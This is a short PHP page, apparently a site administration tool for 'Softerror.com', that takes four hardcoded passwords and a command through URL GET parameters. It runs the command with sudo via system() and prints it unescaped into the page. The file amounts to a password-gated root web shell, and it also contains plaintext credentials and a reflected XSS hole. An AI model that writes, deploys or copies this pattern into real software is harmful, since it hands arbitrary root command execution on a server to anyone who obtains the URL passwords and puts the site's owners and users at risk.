<?php
require('variables.php');
require('functions.php');

myheader("Softerror.com - Command Execution");

/* $admin1 = $_POST['admin1'];
$admin2 = $_POST['admin2'];
$admin3 = $_POST['admin3'];
$admin4 = $_POST['admin4'];
$cmd = $_POST['cmd'];*/

$admin1 = $_GET['admin1'];
$admin2 = $_GET['admin2'];
$admin3 = $_GET['admin3'];
$admin4 = $_GET['admin4'];
$cmd = $_GET['cmd'];

if ($admin1 == "baboon" && $admin2 == "wootwoot" && $admin3 == "tsirorret" && $admin4 == "DaBomb") {
  print "<p>The passwords are correct. Executing command: <tt>" . $cmd . "</tt></p>";
  print "<pre>";
  system("sudo " . $cmd); 
  /* system($cmd); */
  print "</pre>";
 } else {
  print "<p>Wrong password(s)!</p>\n";
 }

?>


<?php>
myfooter();
?>
